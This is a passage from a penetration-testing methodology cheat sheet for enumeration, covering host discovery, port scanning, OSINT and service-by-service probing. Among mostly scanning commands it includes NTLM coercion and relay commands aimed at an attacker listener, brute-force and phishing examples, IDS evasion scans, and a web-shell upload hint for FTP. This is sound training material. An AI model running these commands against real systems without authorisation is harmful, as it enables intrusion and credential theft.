# Enumeration & Information Gathering Methodology

The master reference for systematic enumeration during a penetration test. This file covers the overall workflow, host discovery, service enumeration per protocol, and post-credential enumeration. It is the starting point that feeds into the [Windows](windows-methodology.md), [Linux](linux-methodology.md), [Web](web-methodology.md), and [Active Directory](active-directory-methodology.md) methodology files.

## Table of Contents

- [Phase 0: Network & Host Discovery](#phase-0-network--host-discovery)
- [Phase 1: Full Port Scanning](#phase-1-full-port-scanning)
- [Phase 2: OSINT & Passive Reconnaissance](#phase-2-osint--passive-reconnaissance)
- [Phase 3: Service-Specific Enumeration](#phase-3-service-specific-enumeration)
  - [3.1 FTP (TCP 21)](#31-ftp-tcp-21)
  - [3.2 SSH (TCP 22)](#32-ssh-tcp-22)
  - [3.3 SMTP (TCP 25 / 465 / 587)](#33-smtp-tcp-25--465--587)
  - [3.4 DNS (TCP/UDP 53)](#34-dns-tcpudp-53)
  - [3.5 HTTP/HTTPS (TCP 80 / 443 / 8080 / 8443 / others)](#35-httphttps-tcp-80--443--8080--8443--others)
  - [3.6 Kerberos (TCP 88)](#36-kerberos-tcp-88)
  - [3.7 POP3 / IMAP (TCP 110 / 143 / 993 / 995)](#37-pop3--imap-tcp-110--143--993--995)
  - [3.8 SMB (TCP 139 / 445)](#38-smb-tcp-139--445)
  - [3.9 RPC / MSRPC (TCP 111 / 135)](#39-rpc--msrpc-tcp-111--135)
  - [3.10 LDAP (TCP 389 / 636 / 3268 / 3269)](#310-ldap-tcp-389--636--3268--3269)
  - [3.11 SNMP (UDP 161)](#311-snmp-udp-161)
  - [3.12 NFS (TCP/UDP 2049)](#312-nfs-tcpudp-2049)
  - [3.13 MSSQL (TCP 1433)](#313-mssql-tcp-1433)
  - [3.14 MySQL / MariaDB (TCP 3306)](#314-mysql--mariadb-tcp-3306)
  - [3.15 RDP (TCP 3389)](#315-rdp-tcp-3389)
  - [3.16 WinRM (TCP 5985 / 5986)](#316-winrm-tcp-5985--5986)
  - [3.17 Redis (TCP 6379)](#317-redis-tcp-6379)
  - [3.18 rsync (TCP 873)](#318-rsync-tcp-873)
  - [3.19 IPMI (UDP 623)](#319-ipmi-udp-623)
  - [3.20 VNC (TCP 5900-5910)](#320-vnc-tcp-5900-5910)
  - [3.21 Finger (TCP 79)](#321-finger-tcp-79)
  - [3.22 PostgreSQL (TCP 5432)](#322-postgresql-tcp-5432)
  - [3.23 Oracle TNS (TCP 1521)](#323-oracle-tns-tcp-1521)
  - [3.24 Memcached (TCP 11211)](#324-memcached-tcp-11211)
  - [3.25 TFTP (UDP 69)](#325-tftp-udp-69)
  - [3.26 WMI (TCP 135)](#326-wmi-tcp-135)
  - [3.27 R-Services (TCP 512 / 513 / 514)](#327-r-services-tcp-512--513--514)
  - [3.28 Webmin / MiniServ (TCP 10000)](#328-webmin--miniserv-tcp-10000)
  - [3.29 IRC (TCP 6667 / 6697)](#329-irc-tcp-6667--6697)
  - [3.30 IKE/IPsec (UDP 500 / 4500)](#330-ikeipsec-udp-500--4500)
- [Phase 4: Post-Credential Enumeration](#phase-4-post-credential-enumeration)
- [Quick Reference: Enumeration by Port](#quick-reference-enumeration-by-port)
- [Quick Reference: Username Enumeration Methods](#quick-reference-username-enumeration-methods)
- [Quick Reference: Password Attack Methods](#quick-reference-password-attack-methods)
- [Quick Reference: Hash Identification](#quick-reference-hash-identification)
- [Common Hashcat Commands](#common-hashcat-commands)
- [LOTL Quick Reference](#lotl-quick-reference)

---

## Phase 0: Network & Host Discovery

**Goal:** Identify all live hosts, map subnet boundaries, and add DNS entries.

### 0.1 Discover Live Hosts
```bash
# Ping sweep (ICMP)
nmap -sn <SUBNET>/24

# ARP scan (same LAN — more reliable than ICMP)
sudo arp-scan -l -I tun0
sudo nmap -sn -PR <SUBNET>/24

# TCP SYN on common ports (when ICMP is blocked)
nmap -sn -PS22,80,135,443,445 <SUBNET>/24

# Masscan — extremely fast port discovery across large ranges
# Scan entire subnet for common ports
sudo masscan <SUBNET>/24 -p 21,22,25,53,80,88,110,135,139,143,389,443,445,636,1433,3306,3389,5432,5985,8080 --rate=1000 -oL masscan_output.txt
# All ports on a single host
sudo masscan <IP> -p 0-65535 --rate=1000 -oL masscan_allports.txt
# Parse masscan output to IP list
grep "^open" masscan_output.txt | awk '{print $4}' | sort -u > live_hosts.txt

# Combine results — save live hosts
nmap -sn <SUBNET>/24 -oG - | grep "Up" | awk '{print $2}' > live_hosts.txt
```

### 0.2 Update /etc/hosts
```bash
# For every discovered hostname, add to /etc/hosts
echo '<IP>  <HOSTNAME>.<DOMAIN> <HOSTNAME>' | sudo tee -a /etc/hosts

# Critical for Kerberos and web vhost-based access
# Always add the DC hostname, domain name, and any discovered vhosts
```

### 0.3 Identify Domain Controllers
```bash
# DNS SRV record query
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DNS_IP>

# Nmap — DC typically has ports 53, 88, 135, 389, 445, 636, 3268
nmap -Pn -p 53,88,135,389,445,636,3268 <SUBNET>/24
```

### 0.4 NetExec — Quick Reference (vs. legacy CrackMapExec)

> Tooling note: this file uses `nxc` (NetExec). On older Kali / lab snapshots the binary is `crackmapexec` — the protocol-first grammar is identical, so substitute the name. The modules below are NetExec-only and will fail on legacy CME. Pin **NetExec ≥ 1.5.1** (CVE in `spider_plus` < 1.5.1). https://github.com/Pennyw0rth/NetExec

```bash
# Protocols added vs CME: nfs, ssh-with-file-transfer
nxc nfs <TARGET>                                                      # NEW — NFS share enum / get-file / put-file

# Coercion — single module replaces PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce/MSEven
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<ATTACKER_IP>

# No-preauth Kerberoast (no creds needed, just usernames + ASREP-roastable accounts)
nxc ldap <DC_IP> -u userlist.txt -p '' --kerberoasting hashes.txt

# Pass-the-Cert (PFX → SMB/WinRM/MSSQL/LDAP)
nxc smb <TARGET> --pfx-cert user.pfx --pfx-base64 <BASE64>            # OR --pem-cert user.crt --pem-key user.key

# BadSuccessor scan (dMSA prerequisites in domain)
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M BadSuccessor

# Other useful modules: timeroast, dpapi-hash, eventlog_creds, gpp_password,
#   recyclebin, spider_plus, change-password, find-delegation,
#   wam (Entra/M365 tokens), entra-id, mssql_coerce, efsr_spray
```

[Back to top](#enumeration--information-gathering-methodology)

---

## Phase 1: Full Port Scanning

**Goal:** Discover every open port on every live host.

### 1.1 TCP All-Ports
```bash
# Fast scan — all 65535 ports
nmap -p- --min-rate 5000 -Pn -oN tcp_allports.txt <IP>

# More reliable (slower)
nmap -p- -T4 -Pn -oN tcp_allports.txt <IP>

# RustScan — blazing fast (scans all ports in ~3 seconds, then auto-pipes to nmap)
# https://github.com/RustScan/RustScan/releases
rustscan -a <IP> --ulimit 5000 -- -sC -sV -Pn -oN rustscan_output.txt

# RustScan — just port discovery (then run nmap manually)
rustscan -a <IP> --ulimit 5000 -b 1500

# RustScan — scan entire subnet
rustscan -a <SUBNET>/24 --ulimit 5000 -b 1500

# RustScan — specific port range
rustscan -a <IP> -r 1-1000 --ulimit 5000
```

> **Tip:** Use RustScan for fast initial port discovery across all hosts, then run detailed nmap scans only on discovered ports. This saves significant time in the CPTS exam.

### 1.2 Detailed Service & Script Scan
```bash
# Run only on discovered open ports
nmap -p <OPEN_PORTS> -sC -sV -Pn -oN tcp_detailed.txt <IP>

# Aggressive (OS detection, scripts, traceroute)
nmap -p <OPEN_PORTS> -A -Pn -oN tcp_aggressive.txt <IP>
```

#### Living-off-the-land alternative — pure bash / PowerShell port sweep

Useful when nmap/rustscan are unavailable, restricted by AV, or you only have a shell on a pivot host.

```bash
# bash /dev/tcp top-20 sweep — no external tools, single host
# Note: bash builtin — NOT available on Alpine ash / busybox
for p in 21 22 23 25 53 80 110 111 135 139 143 389 443 445 587 993 995 3389 5985 8080; do
  (timeout 1 bash -c "</dev/tcp/<IP>/$p" 2>/dev/null) && echo "tcp/$p open"
done

# Parallelized full /24 sweep on one port using xargs
seq 1 254 | xargs -P 50 -I{} bash -c '(timeout 1 bash -c "</dev/tcp/<NET>.{}/445" 2>/dev/null) && echo "<NET>.{}:445 open"'
```

```powershell
# PowerShell 5.1 — ships on Win 8.1 / Server 2012 R2+, sequential
80,135,139,389,443,445,3389,5985 | ForEach-Object {
    $r = Test-NetConnection -ComputerName <IP> -Port $_ -WarningAction SilentlyContinue
    if ($r.TcpTestSucceeded) { "tcp/$_ OPEN" }
}

# PowerShell 7+ ONLY — true parallel, much faster
# Win11 ships pwsh 7.x; Win10 / Server 2016-2019 require manual install
1..1024 | ForEach-Object -Parallel {
    $tcp = New-Object Net.Sockets.TcpClient
    $iar = $tcp.BeginConnect('<IP>', $_, $null, $null)
    if ($iar.AsyncWaitHandle.WaitOne(200)) { "tcp/$_ OPEN" }
    $tcp.Close()
} -ThrottleLimit 100

# Pure cmd.exe — works on every Windows since PS 2.0
for /L %p in (1,1,1024) do @powershell -nop -c "try{(New-Object Net.Sockets.TcpClient).Connect('<IP>',%p);'%p OPEN'}catch{}"
```

> **LOTL:** No nmap signatures, no binaries dropped to disk. Slower than nmap; pair with `1.5` firewall checks to interpret silent ports.


### 1.3 UDP Scanning
```bash
# Top 100 UDP ports (run in background — slow)
sudo nmap -sU --top-ports 100 --min-rate 2000 -Pn -oN udp_top100.txt <IP>

# Common interesting UDP ports: 53 (DNS), 67-68 (DHCP), 69 (TFTP),
# 88 (Kerberos), 123 (NTP), 161 (SNMP), 162 (SNMP Trap), 500 (IKE/IPsec)
```

#### 1.3.1 UDP Enumeration Deep Dive

UDP is connectionless — most scans return `open|filtered` because no reply ≠ closed. Combine multiple tools and probe with service-specific payloads.

```bash
# Wider sweep at acceptable speed
sudo nmap -sU --top-ports 200 -T4 --min-rate 2000 -Pn -oN udp_top200.txt <IP>

# Run service scripts on confirmed UDP ports to upgrade open|filtered → open
sudo nmap -sU -sV -p 53,67,69,123,137,161,500,514,623,1434,1900,4500,5060 \
  --script "default or (discovery and safe)" -Pn -oN udp_services.txt <IP>

# udp-proto-scanner — sends real protocol probes to ~17 UDP services
udp-proto-scanner.pl <IP>
udp-proto-scanner.pl -f targets.txt

# onesixtyone — fast SNMP community brute (UDP 161)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
onesixtyone -c community.txt -i targets.txt -o snmp_hits.txt

# braa — high-speed SNMP MIB walker
braa <COMMUNITY>@<IP>:.1.3.6.*

# Full SNMP enumeration (snmpwalk OID list, hrSWRunParameters cred-hunt, SNMPv3) — see section 3.11
```

**Common UDP services quick-reference:**

| Port | Service | Probe / Tool |
|---|---|---|
| 53 | DNS | `dig any @<IP>` |
| 67/68 | DHCP | `dhcpdump -i <IFACE>` (passive) |
| 69 | TFTP | `tftp <IP>` → `get <FILE>` |
| 123 | NTP | `ntpq -c readvar <IP>`, `ntpdc -c monlist <IP>` |
| 137 | NetBIOS-NS | `nbtscan <IP>`, `nmblookup -A <IP>` |
| 161 | SNMP | `onesixtyone`, `snmpwalk` |
| 500 | IKE/IPsec | `ike-scan -M <IP>` |
| 514 | Syslog | passive listener / `nc -ulvp 514` |
| 623 | IPMI | `nmap --script ipmi-*` (see 3.x IPMI) |
| 1434 | MS-SQL Browser | `nmap --script ms-sql-info -p 1434 -sU` |
| 1900 | SSDP/UPnP | `gssdp-discover` / `nmap --script upnp-info` |
| 4500 | IPsec NAT-T | `ike-scan -M --nat-t <IP>` |
| 5060 | SIP | `svmap.py <IP>`, `sipvicious` |

**LOTL — pure bash UDP knock (no nmap available):**
```bash
# Bash /dev/udp redirection — sends an empty datagram, no reply means "maybe open"
# Pair with tcpdump on attacker side or response-aware service to confirm
for port in 53 67 69 123 137 161 500 514 623 1434 1900 4500 5060; do
  (echo > /dev/udp/<IP>/$port) 2>/dev/null && echo "udp/$port reachable"
done

# Targeted SNMP knock with bash + xxd-crafted GetRequest (community=public, OID=1.3.6.1.2.1.1.1.0)
printf '\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x71\x82\x84\x40\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00' \
  | nc -u -w2 <IP> 161 | xxd | head
```

#### 1.3.2 IPv6 Enumeration

If the network advertises IPv6 (RAs, AAAA records, 802.1Q dual-stack), v6 services often have weaker filtering than v4. mitm6 + ntlmrelayx is a high-signal AD attack — see [active-directory-methodology.md](active-directory-methodology.md) Phase 11.

```bash
# TCP scan against an explicit IPv6 host
sudo nmap -6 -sT -p- --min-rate 2000 -Pn -oN ipv6_tcp.txt <IPv6>
sudo nmap -6 -sT -sV -sC -p <OPEN_PORTS> -oN ipv6_services.txt <IPv6>

# Link-local discovery — every IPv6-enabled host responds to all-nodes multicast
ping6 -c 3 -I <IFACE> ff02::1
ping6 -c 3 -I <IFACE> ff02::2   # all-routers multicast

# Neighbor table after a multicast ping reveals every active v6 neighbor
ip -6 neigh show

# enyx — pull IPv6 addresses from SNMP (works against v4 SNMP that exposes IPv6 MIB)
enyx 2c <COMMUNITY> <IPv4>

# DNS — pull AAAA records and SRV records that reveal IPv6 endpoints
dnsrecon -d <DOMAIN> -t std,axfr,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dig <DOMAIN> AAAA @<DNS_IP>
dig _ldap._tcp.dc._msdcs.<DOMAIN> SRV @<DNS_IP>   # DC IPv6 SRV records

# alive6 / passive_discovery6 (THC IPv6 toolkit)
alive6 <IFACE>
passive_discovery6 <IFACE>

# mitm6 — IPv6 DNS takeover for AD relaying (see AD methodology)
mitm6 -d <DOMAIN> -i <IFACE>
# Pair with: impacket-ntlmrelayx -6 -t ldaps://<DC_FQDN> -wh <ATTACKER_IP> --delegate-access
```

**LOTL — no nmap, IPv6-only socket probe:**
```bash
# Bash TCP probe over IPv6
for port in 22 80 88 389 445 3389 5985; do
  (timeout 2 bash -c "</dev/tcp/[<IPv6>]/$port" 2>/dev/null) && echo "tcp/$port open"
done
```

### 1.4 Nmap Output Management
```bash
# Save in all formats
nmap -p- --min-rate 5000 -Pn -oA scan_results <IP>
# Creates: scan_results.nmap, scan_results.gnmap, scan_results.xml

# Parse grepable output
grep "open" scan_results.gnmap

# Extract just port numbers for further scanning
grep -oP '\d+/open' scan_results.gnmap | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//'
```

### 1.5 Firewall & IDS/IPS Detection (Network-Level)
```bash
# Show scan reasons — differentiates filtered (firewall drop) vs closed (RST returned)
nmap -p <PORTS> -Pn --reason <IP>
# "no-response" / "admin-prohibited" = stateful firewall dropping packets
# "reset" = port is closed, no firewall in path

# ACK scan — maps firewall rules independent of port state
sudo nmap -sA -p <PORTS> -Pn --reason <IP>
# "unfiltered" = ACK got through (stateless or no firewall)
# "filtered" = firewall is blocking ACK packets

# Window scan — alternative ACK-based firewall probe
sudo nmap -sW -p <PORTS> -Pn <IP>

# Fragmented packets — evade simple packet-filter rules
sudo nmap -f -p <PORTS> -Pn <IP>             # 8-byte fragments
sudo nmap -ff -p <PORTS> -Pn <IP>            # 16-byte fragments
sudo nmap --mtu 24 -p <PORTS> -Pn <IP>       # custom MTU (must be multiple of 8)

# Source port spoofing — bypass rules that trust DNS/HTTP source ports
sudo nmap --source-port 53 -p <PORTS> -Pn <IP>
sudo nmap --source-port 80 -p <PORTS> -Pn <IP>

# Decoy scan — obscure true source IP among decoys
sudo nmap -D RND:10 -p <PORTS> -Pn <IP>      # 10 random decoys
sudo nmap -D <DECOY_IP1>,<DECOY_IP2>,ME -p <PORTS> -Pn <IP>  # specific decoys

# Slow scan — evade rate-based IDS/IPS triggers
sudo nmap -T1 -p <PORTS> -Pn <IP>            # paranoid timing
sudo nmap --scan-delay 5s -p <PORTS> -Pn <IP>

# TTL/hop analysis — anomalous TTL drop between hops suggests a filtering device
nmap -p <PORTS> -Pn --traceroute <IP>
# Compare TTL in scan output vs expected OS default (Linux=64, Windows=128, Cisco=255)
```

> **Indicators of a firewall:**
> - Ports consistently `filtered` (no RST, just timeout)
> - Scan rate degrades adaptively over time (IPS rate-limiting)
> - `--reason` shows `admin-prohibited` (explicit ICMP reject from firewall)
> - ACK scan returns `filtered` on ports that appear `open` in SYN scan

### 1.6 Port-Knock Sequences (knockd / iptables recent)

When SSH or another high-value service shows filtered on every probe and a TXT record, README, or banner mentions a list of arbitrary high ports, the firewall is gating the service behind a knock sequence. knockd and iptables -m recent both watch for SYNs against a fixed port order and briefly open the real port (typically 5-15s) for the source IP that completed the sequence.

```bash
# Recognise the trigger — filtered SSH plus 3+ arbitrary high ports in TXT/README/banner
# Hint formats: "open a portal 3456 8234 62431"  or  "TXT knock=3456,8234,62431"

# Pull the sequence from DNS first — knockd configs are usually static
dig +short TXT <DOMAIN> @<DNS_SERVER>
dig axfr <DOMAIN> @<DNS_SERVER>

# Knock with nmap (correct source IP, no extra tooling, fastest path)
for x in <PORT1> <PORT2> <PORT3>; do
  nmap -Pn --max-retries 0 -p $x --host-timeout 201ms --max-scan-delay 0 <TARGET>
done && ssh <USER>@<TARGET>
```

#### Living-off-the-land alternative — pure bash /dev/tcp
```bash
# Single SYN-and-close per port, no nmap required
for x in <PORT1> <PORT2> <PORT3>; do
  (timeout 1 bash -c "exec 3<>/dev/tcp/<TARGET>/$x") 2>/dev/null
done && ssh <USER>@<TARGET>
```

#### Living-off-the-land alternative — hping3
```bash
# Raw SYN with no completion — closer to what knockd watches for
for x in <PORT1> <PORT2> <PORT3>; do hping3 -S -p $x -c 1 <TARGET>; done
ssh <USER>@<TARGET>
```

#### Dedicated client — knock
```bash
# https://github.com/jvinet/knock
knock <TARGET> <PORT1> <PORT2> <PORT3>
ssh <USER>@<TARGET>

# One-liner with the connect step (window often under 10s, do not sleep between knock and ssh)
for x in <PORT1> <PORT2> <PORT3>; do nmap -Pn -p $x <TARGET>; done; ssh <USER>@<TARGET>
```

> **Tip:** Treat the knock sequence as a credential. If it is published in DNS TXT or a README, it is the auth factor. Try the sequence both forward and reverse; some configs require a separate close sequence too.

> **OPSEC:** The knock pattern (3+ SYNs to high ports from one source within seconds, followed by a connect to the gated port) is itself a high-signal IOC.

```bash
# Server-side recon (post-access) — confirm knockd / iptables-recent for the engagement report
cat /etc/knockd.conf 2>/dev/null
ss -lntup | grep -i knock
ps auxf | grep -i knock
sudo iptables -L -n -v | grep -i recent
sudo nft list ruleset 2>/dev/null | grep -iE 'recent|knock'
```

[Back to top](#enumeration--information-gathering-methodology)

---

## Phase 2: OSINT & Passive Reconnaissance

**Goal:** Gather external information without directly touching the target network. Useful for external scoping or building username lists.

### 2.1 Email & Username Harvesting
```bash
# theHarvester — emails, hosts, subdomains
theHarvester -d <DOMAIN> -b google,bing,linkedin,dnsdumpster -l 500 -f output.html

# LinkedIn employee list → build username wordlist
# Common formats: jsmith, john.smith, j.smith, smithj
# Use tools: linkedin2username, namemash

# Generate username list from names
cat names.txt | while read line; do
  first=$(echo $line | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
  last=$(echo $line | awk '{print $2}' | tr '[:upper:]' '[:lower:]')
  echo "${first}.${last}"
  echo "${first:0:1}${last}"
  echo "${first}${last:0:1}"
  echo "${first}${last}"
done | sort -u > usernames.txt
```

### 2.2 Subdomain Enumeration
```bash
# Passive
subfinder -d <DOMAIN> -silent -o subdomains.txt
amass enum -passive -d <DOMAIN> -o amass_subs.txt

# Check which resolve
cat subdomains.txt | dnsx -silent -a -resp -o resolved.txt

# Certificate transparency logs
curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u
```

### 2.3 Google Dorking
```text
site:<DOMAIN> filetype:pdf
site:<DOMAIN> filetype:docx
site:<DOMAIN> filetype:xlsx
site:<DOMAIN> inurl:login
site:<DOMAIN> inurl:admin
site:<DOMAIN> intitle:"index of"
site:<DOMAIN> ext:sql | ext:bak | ext:cfg | ext:env
site:<DOMAIN> "password" | "apikey" | "secret"
```

### 2.4 Shodan / Censys
```bash
# Shodan CLI
shodan search "hostname:<DOMAIN>"
shodan host <IP>

# Censys
censys search "<DOMAIN>"
```

### 2.5 Metadata Extraction
```bash
# Download public documents
wget -r -l 1 -A pdf,docx,xlsx,pptx http://<DOMAIN>/

# Extract metadata (authors, software, paths, usernames)
exiftool -a -u *.pdf *.docx
# Look for: Author, Creator, Producer, Last Modified By
```

### 2.6 Custom Wordlist Generation
```bash
# CeWL — scrape target website for custom wordlist
cewl http://<TARGET> -d 3 -m 5 -w cewl_wordlist.txt
# -d = depth, -m = minimum word length

# CeWL with emails
cewl http://<TARGET> -d 3 -m 5 -e --email_file emails.txt -w cewl_wordlist.txt

# Generate password mutations from wordlist
# Hashcat rules (append to cracking command)
# For full cracking methodology (modes, rules, strategies), see password-cracking.md
hashcat -m <MODE> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <MODE> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# John rules
john --wordlist=wordlist.txt --rules=best64 hashes.txt

# Manual mutation patterns to try:
# Word + 1-4 digits: Password1, Password123, Password2024
# Word + special: Password!, Password@, Password#
# Season + Year: <SEASON><YEAR>! (e.g. Spring2025!, Winter2025!)
# Capitalize first letter: password → Password
# Leet speak: Password → P@ssw0rd
```

### 2.7 Breach / Credential Databases
```text
- dehashed.com
- haveibeenpwned.com
- breachforums (dark web)
- intelligence tools (SpiderFoot, Recon-ng modules)
```

[Back to top](#enumeration--information-gathering-methodology)

---

## Phase 3: Service-Specific Enumeration

**Goal:** For each open port/service, perform deep enumeration.

### 3.1 FTP (TCP 21)
```bash
# Anonymous login check
ftp <IP>
# Login: anonymous / anonymous@ / ftp / ftp@

# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -Pn <IP>

# Download all files recursively
wget -r --no-passive ftp://anonymous:anonymous@<IP>/

# Check for writable directories (upload web shell, drop malicious file)
# In ftp: put test.txt → if successful, directory is writable
```

### 3.2 SSH (TCP 22)
```bash
# Banner grab
nc -nv <IP> 22
nmap -p 22 -sV -Pn <IP>

# Auth methods
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 user@<IP> 2>&1

# Supported algorithms (look for weak ciphers)
nmap -p 22 --script ssh2-enum-algos -Pn <IP>

# User enumeration (CVE-2018-15473 — OpenSSH ≤ 7.7, fixed in 7.8)
# Use Metasploit's auxiliary module (no external tool fetch required)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <IP>; set USER_FILE users.txt; run; exit"

# Brute-force
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4
netexec ssh <IP> -u users.txt -p passwords.txt
```

### 3.3 SMTP (TCP 25 / 465 / 587)
```bash
# Banner grab
nc -nv <IP> 25

# Nmap scripts
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay -Pn <IP>

# User enumeration (VRFY / EXPN / RCPT TO)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -D <DOMAIN> -t <IP>

# Send email (for phishing or testing)
swaks --to victim@<DOMAIN> --from attacker@<DOMAIN> --server <IP> --body "Test" --header "Subject: Test"
```

#### 3.3.1 SMTP User Enumeration (Tool + LOTL)

Three commands distinguish valid from invalid users — `VRFY`, `EXPN`, and the `MAIL FROM`/`RCPT TO` differential. Modern Postfix/Exchange disable VRFY/EXPN; RCPT TO still leaks user existence on most setups.

```bash
# Tool — smtp-user-enum across all three methods
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -D <DOMAIN> -t <IP>

# Tool — Metasploit
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <IP>; set USER_FILE users.txt; run; exit"

# Tool — Nmap NSE
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,RCPT,EXPN},userdb=users.txt <IP>
```

**LOTL — raw nc / bash differential probe:**
```bash
# Manual VRFY session
(echo "EHLO test"; echo "VRFY <USER>"; echo "QUIT") | nc -nv <IP> 25
# 250 / 252 = exists, 550 = unknown

# Manual EXPN session (often disabled but worth a try)
(echo "EHLO test"; echo "EXPN <USER>"; echo "QUIT") | nc -nv <IP> 25

# RCPT TO differential — most reliable on modern servers
for u in $(cat users.txt); do
  result=$(printf 'EHLO probe\r\nMAIL FROM:<a@b.c>\r\nRCPT TO:<%s@<DOMAIN>>\r\nQUIT\r\n' "$u" | nc -nv -w3 <IP> 25 2>/dev/null | grep -E '^(250|550|553)')
  echo "$u :: $result"
done | tee smtp_enum.log
# 250 OK = valid recipient, 550/553 Unknown user = invalid
```

### 3.4 DNS (TCP/UDP 53)
```bash
# Identify the domain
nslookup
> server <IP>
> <IP>

# Zone transfer (always try!)
dig axfr @<IP> <DOMAIN>
host -l <DOMAIN> <IP>
dnsrecon -d <DOMAIN> -n <IP> -t axfr

# Forward lookup brute-force
dnsrecon -d <DOMAIN> -n <IP> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <DOMAIN> -r <IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse lookup sweep
dnsrecon -r <SUBNET>/24 -n <IP>

# Any records
dig any <DOMAIN> @<IP>

# Specific record types
dig <DOMAIN> @<IP> MX     # Mail
dig <DOMAIN> @<IP> TXT    # SPF, DKIM, etc.
dig <DOMAIN> @<IP> NS     # Name servers
dig <DOMAIN> @<IP> AAAA   # IPv6
dig <DOMAIN> @<IP> SRV    # Services
```

### 3.5 HTTP/HTTPS (TCP 80 / 443 / 8080 / 8443 / others)
```bash
# Technology fingerprinting
whatweb http://<IP>
curl -I http://<IP>

# Quick look for common files
curl -s http://<IP>/robots.txt
curl -s http://<IP>/sitemap.xml

# Directory enumeration
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,html,txt,bak -t 50 -o gobuster.txt

# Recursive enumeration
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx -d 3 -t 50 -o feroxbuster.txt

# Parameter fuzzing
ffuf -u "http://<IP>/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <BASELINE>

# Virtual host discovery — HTTP
ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <BASELINE_SIZE>
gobuster vhost -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Virtual host discovery — HTTPS (use -k to bypass self-signed cert errors)
ffuf -u https://<IP> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs <BASELINE_SIZE>
# If target only redirects to HTTPS, scan HTTPS from the start or all vhosts will 302
# Also scan non-standard ports where the web server is listening (8080, 8443, etc.):
ffuf -u https://<IP>:8443 -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs <BASELINE_SIZE>

# Screenshot web services across range
# https://github.com/RedSiege/EyeWitness
eyewitness --web -f urls.txt -d eyewitness_output

# WAF detection
wafw00f http://<IP>
```

#### Living-off-the-land alternative — curl / PowerShell directory brute

When ffuf/gobuster/feroxbuster are blocked, signatured, or unavailable on a pivot host.

```bash
# curl + xargs parallel sweep with status-code filter (50 workers)
xargs -a /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -P 50 -I{} \
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" "http://<IP>/{}" \
  | grep -Ev '^(404|400) '

# HTTPS variant with self-signed cert tolerance + host header
xargs -a wordlist.txt -P 50 -I{} \
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" -H "Host: <VHOST>" "https://<IP>/{}" \
  | grep -Ev '^(404|400) '

# Single-threaded fallback when xargs unavailable
while read -r p; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://<IP>/$p")
  [ "$code" != "404" ] && echo "$code  /$p"
done < wordlist.txt
```

```powershell
# PowerShell Invoke-WebRequest loop (works on any modern Windows)
Get-Content C:\wordlist.txt | ForEach-Object {
    try {
        $r = Invoke-WebRequest -Uri "http://<IP>/$_" -UseBasicParsing -MaximumRedirection 0 -ErrorAction Stop
        "$($r.StatusCode)  /$_"
    } catch {
        if ($_.Exception.Response.StatusCode.value__ -ne 404) {
            "$($_.Exception.Response.StatusCode.value__)  /$_"
        }
    }
}
```

> For full web methodology: [web-methodology.md](web-methodology.md)

#### 3.5.1 Vhost Fuzzing (Distinct from Subdomain Enumeration)

Subdomain enum proves a name resolves in DNS. **Vhost fuzzing proves the web server itself routes a different application based on the `Host:` header**, even when the name has no public DNS record. Always run vhost fuzzing against any HTTP service — internal/staging vhosts are frequently bound only to the IP and reachable only via `Host:` manipulation.

```bash
# Step 1 — baseline: confirm response size for an unknown vhost
curl -s -o /dev/null -w "%{size_download}\n" -H "Host: definitely-does-not-exist.<DOMAIN>" http://<IP>/
# Use that number as <BASELINE_SIZE> below to filter default-vhost responses

# ffuf — size-based filter (works when default vhost returns a fixed length)
ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <BASELINE_SIZE>

# ffuf — response-size auto-filter (no manual baseline) using -ac (auto-calibrate)
